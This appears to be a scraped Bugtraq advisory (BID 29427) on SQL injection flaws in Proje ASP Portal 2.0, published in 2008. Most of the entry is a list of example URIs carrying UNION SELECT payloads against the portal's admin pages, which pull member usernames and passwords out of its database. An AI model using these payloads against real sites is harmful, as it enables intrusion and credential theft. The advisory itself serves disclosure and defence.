@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid29427<p><b><span style="font-size: 18pt;">Proje ASP Portal 'id' Parameter Multiple SQL Injection Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/29427/info">info</a><br><a href="http://www.securityfocus.com/bid/29427/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/29427/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/29427/solution">solution</a><br><a href="http://www.securityfocus.com/bid/29427/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				29427
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 29 2008 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 29 2008 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Ugurcan Engin
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Proje ASP Portal Proje ASP Portal 2.0 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit these issues.<br/><br/>The following example URIs are available:<br/><br/>http://www.example.com/portal/yonetici/sayfalar.asp?islem=menuduzenle&amp;amp;id=3+union+select+0,kadi,sifre,3,4,5,6+from+uyeler<br/>http://www.example.com/portal/yonetici/bloklar.asp?islem=bloklar&amp;amp;id=1+union+select+0,sifre,kadi,null,4,5+from+uyeler<br/>http://www.example.com/portal/yonetici/chat.asp?islem=chat&amp;amp;id=1+union+select+0,sifre+from+uyeler<br/>http://www.example.com/portal/yonetici/dostsiteler.asp?islem=dost&amp;amp;id=8+union+select+0,kadi,2,sifre+from+uyeler<br/>http://www.example.com/portal/yonetici/dosya.asp?islem=dosyakategorisiduzenle&amp;amp;id=1+union+select+0,sifre,2,3+from+uyeler<br/>http://www.example.com/portal/yonetici/dosya.asp?islem=dosyakategorisiduzenle&amp;amp;id=1+union+select+0,kadi,2,3+from+uyeler<br/>http://www.example.com/portal/yonetici/haber.asp?islem=haber&amp;amp;id=1+union+select+0,1,2,kadi,sifre,5,6,7,8,9+from+uyeler<br/>http://www.example.com/portal/yonetici/ilan.asp?islem=ilankategorisiduzenle&amp;amp;id=1+union+select+0,sifre,2,3+from+uyeler<br/>http://www.example.com/portal/yonetici/oyun.asp?islem=oyunkategorisiduzenle&amp;amp;id=1+union+select+0,kadi+from+uyeler<br/>http://www.example.com/portal/yonetici/oyun.asp?islem=oyunkategorisiduzenle&amp;amp;id=1+union+select+0,sifre+from+uyeler<br/>http://www.example.com/portal/yonetici/resim.asp?islem=resimkategorisiduzenle&amp;amp;id=1+union+select+0,sifre+from+uyeler<br/>http://www.example.com/portal/yonetici/resim.asp?islem=resimkategorisiduzenle&amp;amp;id=1+union+select+0,kadi+from+uyeler<br/>http://www.example.com/portal/yonetici/toplist.asp?islem=toplistkategoriduzenle&amp;amp;id=1+union+select+0,sifre+from+uyeler<br/>http://www.example.com/portal/yonetici/toplist.asp?islem=toplistkategoriduzenle&amp;amp;id=1+union+select+0,kadi+from+uyeler<br/>http://www.example.com/portal/yonetici/video.asp?islem=videokategorisiduzenle&amp;amp;id=1+union+select+0,sifre+from+uyeler<br/>http://www.example.com/portal/yonetici/video.asp?islem=videokategorisiduzenle&amp;amp;id=1+union+select+0,kadi+from+uyeler<br/>http://www.example.com/portal/yonetici/yazi.asp?islem=yazialtkategoriduzenle&amp;amp;id=1+union+select+0,sifre,2,3+from+uyeler<br/>http://www.example.com/portal/yonetici/yazi.asp?islem=yazialtkategoriduzenle&amp;amp;id=1+union+select+0,kadi,2,3+from+uyeler<br/>http://www.example.com/portal/yonetici/uyeler.asp?islem=uyebilgi&amp;amp;id=1+union+select+0,1,2,3,4,sifre,kadi,7,8,1,1,1,1,1,1,9,1,0,1,1,1,1,1,1+from+uyeler
+	
+		<ul>
+</ul>
+</div>
